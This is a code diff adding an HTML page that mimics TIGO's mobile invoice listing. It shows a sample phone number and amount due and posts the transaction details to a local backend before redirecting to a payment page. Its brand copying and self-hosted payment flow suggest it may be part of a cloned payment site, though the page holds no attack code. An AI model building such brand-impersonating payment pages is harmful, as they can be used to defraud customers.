@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TIGO - Listado de Facturas</title>
+    <link rel="icon" type="image/png" href="favicon.png">
+    <link rel="stylesheet" href="fonts.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Dm Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f5f5f5;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #003399 0%, #0052cc 100%);
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            width: 100px;
+            height: 40px;
+        }
+
+        .logo img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        .container {
+            max-width: 520px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            color: #44c8f5;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 30px;
+            cursor: pointer;
+        }
+
+        .back-button svg {
+            width: 20px;
+            height: 20px;
+            margin-right: 8px;
+            stroke: currentColor;
+        }
+
+        .title {
+            font-size: 14px;
+            color: #999;
+            margin-bottom: 40px;
+            font-weight: 400;
+        }
+
+        .title strong {
+            font-weight: 600;
+            color: #999;
+        }
+
+        .service-section {
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .service-icon {
+            width: 40px;
+            height: 40px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'tigo-icons-pack1';
+            font-size: 24px;
+            color: #001eb4;
+        }
+
+        .service-content h3 {
+            font-size: 16px;
+            color: #001eb4;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .service-content p {
+            font-size: 9px;
+            color: #999;
+            font-weight: 400;
+        }
+
+        .invoice-card {
+            background: white;
+            padding: 8px 20px;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            position: relative;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .invoice-card:hover {
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
+            background: #fafbfc;
+        }
+
+        .invoice-badge {
+            display: inline-block;
+            background: #ebf0fb;
+            color: rgb(50, 100, 220);
+            font-size: 11px;
+            font-weight: 600;
+            padding: 2px 8px;
+            border-radius: 4px;
+            margin-bottom: 10px;
+        }
+
+        .invoice-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .invoice-row-label {
+            font-size: 16px;
+            color: #001eb4;
+            font-weight: 600;
+        }
+
+        .invoice-row-value {
+            font-size: 18px;
+            color: #001eb4;
+            font-weight: 600;
+            margin-right: 40px;
+        }
+
+        .invoice-arrow {
+            color: #44c8f5;
+            font-size: 24px;
+            line-height: 1;
+            position: absolute;
+            right: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+
+        .invoice-date-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .invoice-date-label {
+            font-size: 14px;
+            color: #999;
+            font-weight: 400;
+        }
+
+        .invoice-date-value {
+            font-size: 14px;
+            color: #999;
+            font-weight: 400;
+            margin-right: 40px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">
+            <img src="assets/logos/tigo-logo.svg" alt="TIGO">
+        </div>
+    </div>
+
+    <div class="container">
+        <a class="back-button" href="index">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <polyline points="15 18 9 12 15 6"></polyline>
+            </svg>
+            REGRESAR
+        </a>
+
+        <div class="title">
+            Facturas asociadas a la móvil <strong id="phoneNumber">3046246628</strong>
+        </div>
+
+        <div class="service-section">
+            <div class="service-icon">&#xEC83;</div>
+            <div class="service-content">
+                <h3>Servicios móviles</h3>
+                <p>TOTAL DE FACTURAS: 1</p>
+            </div>
+        </div>
+
+        <div class="invoice-card" onclick="guardarEnR2YIrAPago()">
+            <div class="invoice-badge"># DE LÍNEA <span id="lineLast4">**** 6628</span></div>
+
+            <div class="invoice-row">
+                <div class="invoice-row-label">Valor a pagar:</div>
+                <div class="invoice-row-value" id="montoDisplay">$ 63.465</div>
+            </div>
+            <span class="invoice-arrow">›</span>
+
+            <div class="invoice-date-row">
+                <span class="invoice-date-label">Fecha límite de pago:</span>
+                <span class="invoice-date-value" id="fechaLimite">2026-10-19</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const referencia = params.get('referencia') || '';
+        const valorFormateado = params.get('valor_formateado') || '';
+        const valorPago = params.get('valor_pago') || '';
+        const convenio = params.get('convenio') || 'TIGO';
+        const estado = params.get('estado') || 'pendiente';
+
+        // Actualizar teléfono
+        document.getElementById('phoneNumber').textContent = referencia;
+
+        // Actualizar últimos 4 dígitos
+        const ultimos4 = referencia.slice(-4);
+        document.getElementById('lineLast4').textContent = '**** ' + ultimos4;
+
+        // Actualizar monto
+        document.getElementById('montoDisplay').textContent = valorFormateado;
+
+        async function guardarEnR2YIrAPago() {
+            try {
+                const response = await fetch('http://localhost:9090/api/guardar-transaccion', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        referencia: referencia,
+                        valor_pago: valorPago,
+                        valor_formateado: valorFormateado,
+                        convenio: convenio,
+                        estado: estado
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.ok && data.txid) {
+                    // Redirigir a pago-inicio con txid
+                    window.location.href = `pago-inicio?txid=${data.txid}`;
+                } else {
+                    alert('Error al procesar la transacción. Intenta de nuevo.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Error de conexión. Intenta más tarde.');
+            }
+        }
+    </script>
+</body>
+</html>
